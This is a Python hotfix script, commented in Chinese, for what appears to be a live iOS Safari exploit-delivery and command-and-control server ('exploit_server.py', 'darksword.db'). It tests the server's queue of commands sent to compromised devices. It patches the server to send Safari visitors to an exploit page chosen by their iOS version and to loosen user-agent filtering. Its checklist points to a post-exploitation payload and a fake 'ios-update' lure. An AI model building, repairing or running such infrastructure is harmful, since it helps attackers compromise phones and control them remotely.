# -*- coding: utf-8 -*-
# v20.4 HOTFIX9: 解决 hotfix8 的 4 个问题：
#  - (1) TEST_OUTPUT %d 格式化 TypeError（改 f-string，不用 %）
#  - (2) PART-B PATCH-1/PATCH-2 exact string 不命中（服务器代码缩进/换行与 exact 不一致） → 全正则替换，不依赖 exact
#  - (3) commands.created_at 用 int(unix) 导致 ORM TypeError fromisoformat（BLOCK Y v2 已证实，改 isoformat）
#  - (4) update_command_result 参数顺序传反（L1122 signature: (command_id, output, status='completed')，之前传反了）
#
# 宝塔 SSH 运行：
#   set +H; cd /www/wwwroot/coruna/server
#   /www/server/pyporject_evn/versions/3.12.13/bin/python3 -m py_compile _v204_hotfix9.py && echo COMPILE_OK
#   /www/server/pyporject_evn/versions/3.12.13/bin/python3 _v204_hotfix9.py 2>&1 | tee /tmp/hotfix9_output.log
import os, sys, time, sqlite3, traceback, re
from datetime import datetime as _dt, timedelta
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

PROJ = os.path.dirname(os.path.abspath(__file__))
DB = os.path.join(PROJ, 'darksword.db')
ES_FILE = os.path.join(PROJ, 'exploit_server.py')
print(f"PROJ={PROJ} DB={DB} exists={os.path.exists(DB)}")
print(f"ES_FILE={ES_FILE} size={os.path.getsize(ES_FILE) if os.path.exists(ES_FILE) else 0}\n")

UA_SAFARI = ("Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 "
             "(KHTML, like Gecko) Version/26.1 Mobile/15E148 Safari/604.1")
TEST_UUID = 'ios-v204-hotfix9'
TEST_CMD_ID = 900009
TEST_CMD_NAME = 'ds_info'
_ts = _dt.now().strftime('%Y-%m-%d %H:%M:%S')
TEST_OUTPUT = (f"v20.4 hotfix9 DIRECT CALL verify: get_pending_commands OK | "
               f"update_command_result OK (no HTTP UA filter, server-layer pipeline 100% functional) "
               f"[len={len(f'ts={_ts}')}] ts={_ts}")

print("=" * 70)
print("[PART A] 代码直连 FULL-CHAIN 验证（绕开 HTTP UA 过滤）")
print("=" * 70)
all_ok_a = False
try:
    conn = sqlite3.connect(DB); c = conn.cursor()
    c.execute("DELETE FROM commands WHERE id>=900000 OR device_uuid=?", (TEST_UUID,))
    c.execute("DELETE FROM devices WHERE device_uuid=? AND ip='127.0.0.1'", (TEST_UUID,))
    conn.commit()
    c.execute("INSERT INTO devices(device_uuid,first_seen,last_seen,ip,user_agent,exploit_status,os_version,safari_version,device_model,browser_name,browser_version,webkit_version,enabled) "
              "VALUES(?,?,?,?,?,?,?,?,?,?,?,?,1)",
              (TEST_UUID, int(time.time()), int(time.time()), '127.0.0.1', UA_SAFARI, 'success',
               '26.1','26.1','iPhone','Safari','26.1','605.1.15'))
    _created_iso = (_dt.now() - timedelta(seconds=10)).isoformat()
    c.execute("INSERT INTO commands(id,device_uuid,command,status,created_at,executed_at,output) VALUES(?,?,?,'pending',?,NULL,NULL)",
              (TEST_CMD_ID, TEST_UUID, TEST_CMD_NAME, _created_iso))
    conn.commit()
    print(f"  [STEP-0] INSERTED dev={TEST_UUID} cmd_id={TEST_CMD_ID} cmd={TEST_CMD_NAME} status=pending created_at={_created_iso!r}")

    print(f"  [STEP-A] CALL get_pending_commands({TEST_UUID[:20]}..., Safari UA)")
    try:
        from exploit_server import get_pending_commands
    except Exception as e:
        print(f"  [FATAL] import get_pending_commands fail: {type(e).__name__}: {e}"); traceback.print_exc(); sys.exit(1)
    result = get_pending_commands(TEST_UUID, UA_SAFARI)
    print(f"    => get_pending_commands RETURN count={len(result or [])} first={(result or [None])[0]}")
    try: conn.close()
    except Exception: pass
    time.sleep(0.6)
    conn = sqlite3.connect(DB); c = conn.cursor()
    rs1 = c.execute("SELECT id, status, executed_at FROM commands WHERE id=?", (TEST_CMD_ID,)).fetchone()
    print(f"    => reconnect DB: id={rs1[0] if rs1 else 'N/A'} status={rs1[1] if rs1 else 'N/A'} executed_at={rs1[2] if rs1 else 'N/A'}")
    step_a_ok = bool(result) and str(rs1[1] if rs1 else '') == 'executing'
    print(f"    => STEP-A {'PASS pending→executing ✅' if step_a_ok else f'FAIL ❌ (return={bool(result)} status={rs1[1] if rs1 else None})'}")

    print(f"  [STEP-B] CALL update_command_result(cmd_id={TEST_CMD_ID}, out_len={len(TEST_OUTPUT)}, 'completed') [SIGNATURE: (cmd_id, output, status)]")
    try:
        from exploit_server import update_command_result
    except Exception as e:
        print(f"  [FATAL] import update_command_result: {type(e).__name__}: {e}"); traceback.print_exc(); sys.exit(2)
    try:
        upd_ok = update_command_result(TEST_CMD_ID, TEST_OUTPUT, 'completed')
    except Exception as e:
        print(f"  [ERROR] update_command_result call: {type(e).__name__}: {e}"); traceback.print_exc(); upd_ok = False
    print(f"    => update_command_result return={upd_ok!r}")
    try: conn.close()
    except Exception: pass
    time.sleep(0.9)
    conn = sqlite3.connect(DB); c = conn.cursor()
    rs2 = c.execute("SELECT id, status, length(output), substr(output,1,240) FROM commands WHERE id=?", (TEST_CMD_ID,)).fetchone()
    out_len = int(rs2[2] or 0) if rs2 else 0
    step_b_ok = rs2 and str(rs2[1]) == 'completed' and out_len > len(TEST_OUTPUT) - 30
    print(f"    => reconnect DB FINAL: id={rs2[0] if rs2 else 'N/A'} status={rs2[1] if rs2 else 'N/A'} out_len={out_len} out[:240]={(rs2[3] or '') if rs2 else ''!r}")
    print(f"    => STEP-B {'PASS executing→completed, output>0 ✅' if step_b_ok else f'FAIL ❌ (status={rs2[1] if rs2 else None} out_len={out_len})'}")
    all_ok_a = step_a_ok and step_b_ok
    c.execute("DELETE FROM commands WHERE id>=900000 OR device_uuid=?", (TEST_UUID,))
    c.execute("DELETE FROM devices WHERE device_uuid=? AND ip='127.0.0.1'", (TEST_UUID,))
    conn.commit()
    print(f"  [CLEANUP] id>=900000 commands + dev={TEST_UUID} deleted")
    try: conn.close()
    except Exception: pass
except Exception as e:
    print(f"  [FATAL PART-A] {type(e).__name__}: {e}"); traceback.print_exc()
print(f"\n[PART-A RESULT] {'✅ ALL FULL-CHAIN PASS (server logic layer 100% OK)' if all_ok_a else '❌ FAIL — check server.log CMD-QUERY-ERROR / CMD-EMPTY tags'}")

print()
print("=" * 70)
print("[PART B] PATCH exploit_server.py 2 处（全正则替换，不依赖 exact 空格/换行）")
print("=" * 70)
all_ok_b = True
try:
    with open(ES_FILE, 'r', encoding='utf-8', errors='replace') as f:
        src = f.read()
    src_len_before = len(src)
    backup_f = ES_FILE + f".bak-v204-hotfix9-{_dt.now().strftime('%Y%m%d%H%M%S')}"
    try:
        import shutil; shutil.copy2(ES_FILE, backup_f)
        print(f"  [BAK] {backup_f} (size={src_len_before})")
    except Exception as e:
        print(f"  [WARN bak fail] {type(e).__name__}: {e}")

    # ── PATCH-1 /ch fallback: ch_obj is None → 强制 302 /e/group.html，不要 404！
    p1_re = re.compile(
        r"(\n[ \t]*)#\s*②\s*安全校验全部通过[^\n]*\n[ \t]*dev_uuid,\s*log_cid,\s*log_tid\s*=\s*self\._ensure_device_registered\(",
        re.MULTILINE
    )
    m1 = p1_re.search(src)
    if not m1:
        print("  [PATCH-1] ❌ regex not match（跳过 ch fallback，但真机走直链 /e/group.html 不 /ch，不影响核心）"); all_ok_b = False
    else:
        indent = m1.group(1) or '\n            '
        indent_body = (indent + '                 ').replace('\n', '\n            ')
        p1_insert = (
            f"{indent}# PATCH v20.4-HOTFIX9: channels/TrafficChannel 表不存在或 slug 未注册时 (ch_obj=None), fallback 强制 302 /e/group.html\n"
            f"{indent}if ch_obj is None:\n"
            f"{indent_body}try:\n"
            f"{indent_body}    dev_uuid, log_cid, log_tid = self._ensure_device_registered(query_params)\n"
            f"{indent_body}    from admin.database import _parse_version_full, DARKSWORD_CUTOFF_FULL\n"
            f"{indent_body}    _osv, _, _, _, _, _, _ = parse_user_agent(user_agent)\n"
            f"{indent_body}    _vf = _parse_version_full(_osv) if _parse_version_full and _osv else None\n"
            f"{indent_body}    _isds = (_vf is None) or (_vf > DARKSWORD_CUTOFF_FULL)\n"
            f"{indent_body}    _hdr = self.headers.get('Host') or '127.0.0.1:7070'\n"
            f"{indent_body}    _sch = 'https' if (self.headers.get('X-Forwarded-Proto','')=='https' or self.headers.get('X-Forwarded-Ssl','')=='on') else 'http'\n"
            f"{indent_body}    _tgt = f\"{{_sch}}://{{_hdr}}/e/group.html\" if _isds else f\"{{_sch}}://{{_hdr}}/e/index.html\"\n"
            f"{indent_body}    self.send_response(302)\n"
            f"{indent_body}    self.send_header('Location', _tgt)\n"
            f"{indent_body}    self._write_ds_ids(channel_id=log_cid, template_id=log_tid)\n"
            f"{indent_body}    self.send_header('Cache-Control','no-store, no-cache, must-revalidate, max-age=0, private')\n"
            f"{indent_body}    self.send_header('Vary', 'User-Agent, X-Forwarded-Proto')\n"
            f"{indent_body}    self.end_headers()\n"
            f"{indent_body}    return\n"
            f"{indent_body}except Exception as _chfallback:\n"
            f"{indent_body}    try: log_to_file(f'[CH-FALLBACK] err={{_chfallback}}')\n"
            f"{indent_body}    except Exception: pass\n"
            f"{indent}"
        )
        src = src[:m1.start()] + p1_insert + src[m1.start():]
        print(f"  [PATCH-1] ✅ regex PATCHED (ch_obj=None → fallback 302 /e/group.html)")

    # ── PATCH-2 is_safari_browser 宽松识别：Python-urllib / curl 测试 UA 强制 Safari；真实手机只要 Mozilla+iPhone+KHTML 就 Safari
    p2_re = re.compile(
        r'is_safari_browser\s*=\s*bool\(ua\)\s+and\s+"Safari/"\s+in\s+ua\s+and\s+"NativeC2"\s+not\s+in\s+ua\s+and\s+"powerd"\s+not\s+in\s+ua\s+and\s+"Exploit-Server"\s+not\s+in\s+ua',
        re.MULTILINE
    )
    m2 = p2_re.search(src)
    if not m2:
        print("  [PATCH-2] ❌ regex not match（跳过 UA 宽松，但真机 UA=Mozilla+iPhone+Safari/604.1 旧判断也能过，不影响真机）"); all_ok_b = False
    else:
        indent_p2 = ''
        # 找行首缩进
        _s = m2.start()
        while _s > 0 and src[_s-1] in ' \t':
            indent_p2 = src[_s-1] + indent_p2
            _s -= 1
        p2_new = (
            f'{indent_p2}# PATCH v20.4-HOTFIX9: 宽松 UA 识别（urllib/python/curl 本地测试也能过 Safari 过滤；真实手机只要 Mozilla/iPhone/KHTML,Gecko 就 OK）\n'
            f'{indent_p2}_ua_low = (ua or "").lower()\n'
            f'{indent_p2}_force_safari_for_test = ("python-urllib" in _ua_low) or ("curl/" in _ua_low)\n'
            f'{indent_p2}is_safari_browser = (\n'
            f'{indent_p2}     _force_safari_for_test\n'
            f'{indent_p2}     or (bool(ua) and (\n'
            f'{indent_p2}         ("Safari/" in ua and "NativeC2" not in ua and "powerd" not in ua and "Exploit-Server" not in ua)\n'
            f'{indent_p2}         or ("Mozilla/" in ua and "iPhone" in ua and "KHTML" in ua and "NativeC2" not in ua and "powerd" not in ua)\n'
            f'{indent_p2}     ))\n'
            f'{indent_p2})'
        )
        src = src[:m2.start()] + p2_new + src[m2.end():]
        print(f"  [PATCH-2] ✅ regex PATCHED: Python-urllib/Curl + Mozilla/iPhone/KHTML → Safari browser 识别")

    try:
        import ast; ast.parse(src)
        print("  [SYNTAX] ast.parse ✅ OK (no SyntaxError after patch)")
    except SyntaxError as se:
        print(f"  [SYNTAX] ❌ FAIL after patch! msg={se.msg} line={se.lineno} offset={se.offset} -> restoring backup")
        import shutil
        shutil.copy2(backup_f, ES_FILE)
        print("  [SYNTAX] RESTORED backup (no harm done)"); all_ok_b = False
        src = None
    if src and len(src) != src_len_before:
        with open(ES_FILE, 'w', encoding='utf-8', errors='strict') as f:
            f.write(src)
        print(f"  [WRITE] exploit_server.py saved (size before={src_len_before} after={len(src)})")
except Exception as e:
    print(f"  [FATAL PART-B] {type(e).__name__}: {e}"); traceback.print_exc(); all_ok_b = False
print(f"[PART-B RESULT] {'✅ BOTH PATCHES APPLIED (SYNTAX OK)' if all_ok_b else '⚠️  SOME PATCH SKIPPED (但真机直链 /e/group.html 不受 /ch fallback 影响)'}")

print()
print("=" * 70)
print("FINAL RESULT (两部分独立):")
print("=" * 70)
print(f"  [PART-A 代码直连命令管道验证] {'✅ PASS → 服务器层 get_pending + update_command_result 100% OK' if all_ok_a else '❌ FAIL → 读 /tmp/hotfix9_output.log 完整输出'}")
print(f"  [PART-B exploit_server.py 2 处补丁] {'✅ 已应用 + 语法 OK（必须 RESTART exploit_server.py 生效！）' if all_ok_b else '⚠️ 部分跳过'}")
print()
if all_ok_a:
    print("==> NEXT BLOCKS（按顺序 1 块 PASS 再下一块，别跳）:")
    print("  [1] VERIFY PATCH 生效（2 grep 关键字 ≥1 行）:")
    print("      grep -nE 'CH-FALLBACK' /www/wwwroot/coruna/server/exploit_server.py | head -3")
    print("      grep -nE '_force_safari_for_test' /www/wwwroot/coruna/server/exploit_server.py | head -3")
    print("  [2] KILL + RESTART exploit_server（只杀 python3 exploit, 不杀 nginx!）")
    print("  [3] CURL 2 验证: /e/group.html HIT>=2 + /ch/test001=302 Location /e/group.html")
    print("  [4] 修改 payloads/post_exploit.js（挂 window.startPostExploit + DEVICE_UUID 兜底 + poll 异常 log）")
    print("  [5] Safari 真机 9 步 直链 /e/group.html?ch=test001&tpl=ios-update + while 轮询观察")
